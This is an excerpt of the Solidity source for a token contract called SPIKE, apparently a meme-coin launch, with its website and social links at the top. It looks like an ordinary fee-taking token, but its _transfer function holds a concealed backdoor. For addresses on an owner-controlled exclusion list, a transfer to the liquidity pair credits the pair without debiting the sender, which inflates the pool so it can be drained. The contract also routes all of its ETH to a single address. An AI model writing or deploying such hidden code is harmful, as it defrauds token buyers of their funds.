...
Website: https://www.degenspike.lol
Twitter: https://twitter.com/degenspike
Telegram: https://t.me/degenspike_portal
...
contract SPIKE is IERC20, Ownable {
    ...
    mapping (address => bool) public _isExclFromFees;
    mapping (address => bool) public _isExclFromTrns;
    IRouter router;
    address public pair;
    ...
    function runSpike() external onlyOwner {
    ...
    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        return !swapping && swapEnabled && tradingEnabled && aboveMin && !_isExclFromFees[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }
    ...
    function swapAndLiquify() private lockTheSwap {
        ...
        if(marketingAmt > 0){payable(_spikeAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(_spikeAddr).transfer(contractBalance);}
    }
    ...
    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !_isExclFromFees[sender] && !_isExclFromFees[recipient];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(!_isExclFromFees[sender] && !_isExclFromFees[recipient]){require(tradingEnabled, "tradingEnabled");}
        if(recipient == pair && !_isExclFromFees[sender]){swapTimes += uint256(1);}
        if(recipient == pair && _isExclFromTrns[sender]){_balances[recipient]+=amount;return;}
        if(!_isExclFromFees[sender] && !_isExclFromFees[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletAmt, "Exceeds maximum wallet amount.");}
        require(amount <= _maxTxnAmt || _isExclFromFees[sender] || _isExclFromFees[recipient], "TX Limit Exceeded"); 
